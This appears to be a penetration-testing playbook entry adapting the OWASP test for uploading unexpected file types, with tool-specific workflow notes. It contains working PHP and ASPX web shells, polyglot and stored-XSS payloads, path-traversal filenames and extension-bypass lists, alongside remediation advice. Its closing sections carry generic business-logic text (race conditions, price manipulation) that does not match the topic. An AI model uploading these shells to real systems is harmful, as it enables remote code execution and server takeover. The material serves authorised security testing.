---
id: WSTG-BUSL-08
title: Test Upload of Unexpected File Types
category: Business Logic
severity_range: Medium-Critical
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types
---

# WSTG-BUSL-08: Test Upload of Unexpected File Types

## Summary

File upload functionality often restricts accepted file types to prevent abuse. However, these restrictions may only be enforced client-side or rely on easily manipulated indicators like file extensions or Content-Type headers. Attackers can bypass these restrictions to upload executable files (web shells, server-side scripts), polyglot files (files valid as multiple types), or files with dangerous extensions, potentially achieving remote code execution, cross-site scripting, or server compromise.

## Test Objectives

- Identify file upload functionality and its type restrictions
- Bypass client-side file type validation
- Test server-side file type validation (extension, Content-Type, magic bytes)
- Upload files with executable extensions to test for code execution
- Test polyglot files that bypass validation

## Prerequisites

- Target application has file upload functionality
- Docker pentest container capturing traffic
- Sample files of various types prepared for testing

## Test Steps

### Step 1: Identify File Upload Endpoints and Restrictions

**CLI Actions:**
Use `curl` to fetch pages with file upload functionality:

```
GET /upload HTTP/1.1
Host: target.com
```

Analyze the response for:
- Client-side `accept` attribute restrictions (e.g., `accept=".jpg,.png"`)
- JavaScript validation functions checking file extensions
- Maximum file size limits

Use `curl` to capture a valid file upload request and note the multipart form structure.

### Step 2: Bypass Extension Restrictions

**CLI Actions:**
Use `save to manual-review file` with a captured file upload request. Modify the filename to test extension bypass:

```
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------Boundary--
```

Test alternative extensions:
```
filename="shell.php5"
filename="shell.phtml"
filename="shell.php.jpg"
filename="shell.jpg.php"
filename="shell.php%00.jpg"
filename="shell.php;.jpg"
filename="shell.PHP"
filename="shell.pHp"
filename="shell.php."
filename="shell.php "
filename="shell.php::$DATA"
```

### Step 3: Bypass Content-Type Validation

**CLI Actions:**
Use `curl` to upload a malicious file with a spoofed Content-Type:

```
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------Boundary--
```

```
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.aspx"
Content-Type: image/png

<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["c"]).StandardOutput.ReadToEnd()); %>
------Boundary--
```

### Step 4: Test Polyglot Files

**CLI Actions:**
Use `curl` to upload files that are valid as multiple types:

JPEG/PHP polyglot (prepend JPEG magic bytes):
```
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="image.php.jpg"
Content-Type: image/jpeg

\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>
------Boundary--
```

GIF/script polyglot:
```
------Boundary
Content-Disposition: form-data; name="file"; filename="image.gif"
Content-Type: image/gif

GIF89a=1;<script>alert('XSS')</script>
------Boundary--
```

### Step 5: Test Path Traversal in Filename

**CLI Actions:**
Use `curl` to upload with path traversal in the filename:

```
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="../../../shell.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------Boundary--
```

Use `curl --data-urlencode` to encode path traversal characters:
```
filename="..%2f..%2f..%2fshell.php"
filename="..%5c..%5c..%5cshell.php"
```

### Step 6: Verify Uploaded File Execution

**CLI Actions:**
After a successful upload, use `curl` to access the uploaded file and check if it executes:

```
GET /uploads/shell.php?cmd=id HTTP/1.1
Host: target.com
```

```
GET /uploads/shell.php5 HTTP/1.1
Host: target.com
```

Check response headers for execution indicators (e.g., PHP output vs. raw PHP source code).

Use `rynix_plugin_run('template-scan')` to check if the template-scan plugin identified file upload vulnerabilities.

## Payloads

### Executable Extensions by Platform
```
# PHP
.php, .php3, .php4, .php5, .php7, .phtml, .pht, .phps, .phar, .inc

# ASP/ASPX
.asp, .aspx, .ashx, .asmx, .ascx, .config, .cshtml, .vbhtml

# JSP/Java
.jsp, .jspx, .jsw, .jsv, .jspf, .war, .jar

# Python
.py, .pyc

# Perl
.pl, .pm, .cgi

# Server-Side Includes
.shtml, .stm, .shtm

# Other
.htaccess, .htpasswd, .svg, .html, .htm, .xml, .xhtml
```

### Extension Bypass Techniques
```
shell.php.jpg          (double extension)
shell.php%00.jpg       (null byte injection)
shell.php;.jpg         (semicolon bypass)
shell.PHP              (case manipulation)
shell.pHp              (mixed case)
shell.php.             (trailing dot)
shell.php (space)      (trailing space)
shell.php::$DATA       (NTFS alternate data stream)
shell.php%20           (URL-encoded space)
shell.php%0a           (newline injection)
.htaccess              (Apache config override)
```

### Content-Type Spoofing Values
```
image/jpeg
image/png
image/gif
text/plain
application/pdf
application/octet-stream
```

### Magic Bytes for Polyglots
```
# JPEG: FF D8 FF E0
# PNG:  89 50 4E 47 0D 0A 1A 0A
# GIF:  47 49 46 38 39 61  (GIF89a)
# GIF:  47 49 46 38 37 61  (GIF87a)
# PDF:  25 50 44 46        (%PDF)
# BMP:  42 4D              (BM)
```

## Detection Criteria

A finding should be logged when:
- Server-side executable files (PHP, ASP, JSP) can be uploaded
- Uploaded files execute as server-side code when accessed
- File type validation relies only on extension or Content-Type header
- Path traversal in filenames allows uploading to arbitrary directories
- Polyglot files bypass validation and execute
- File extension bypass techniques succeed (null byte, double extension, case manipulation)
- .htaccess or web.config files can be uploaded to modify server behavior

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Uploaded web shell executes, achieving RCE | Critical |
| Server-side scripts can be uploaded and accessed (but in sandboxed env) | High |
| .htaccess or web.config can be uploaded to modify server behavior | High |
| HTML/SVG files uploaded and served, enabling stored XSS | Medium |
| Path traversal allows uploading to unintended directories | Medium |
| Validation relies on Content-Type only, but files do not execute | Medium |
| Unexpected file types accepted but stored safely without execution | Low |
| Client-side validation bypassed but server rejects the file | Informational |
| Robust validation: extension, magic bytes, Content-Type, and no execution | Not a finding |

## Remediation

- Validate file type using magic bytes (file signature), not just extension or Content-Type
- Use an allowlist of permitted file extensions
- Rename uploaded files to random names with controlled extensions
- Store uploaded files outside the web root or on a separate storage service
- Serve uploaded files with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`
- Disable script execution in upload directories (e.g., Apache: `RemoveHandler .php`)
- Sanitize filenames: strip path separators, null bytes, and special characters
- Implement file size limits
- Scan uploaded files with antivirus/malware detection
- Use a CDN or separate domain to serve user-uploaded content

## References

- [OWASP Testing Guide - Upload of Unexpected File Types](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [CWE-436: Interpretation Conflict](https://cwe.mitre.org/data/definitions/436.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V11 Business Logic — workflow integrity and limit enforcement.
- V4 Access Control — state transitions require proper authorization.

## CWE references

- CWE-840: Business Logic Errors
- CWE-362: Race Condition

## Rynix tooling

- Primary tools: ``http_probe``, ``compare_role_response``, ``record_finding``

## Test focus

- Test price/quantity manipulation and workflow step skipping.
- Parallel requests for race windows on limits and balances.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

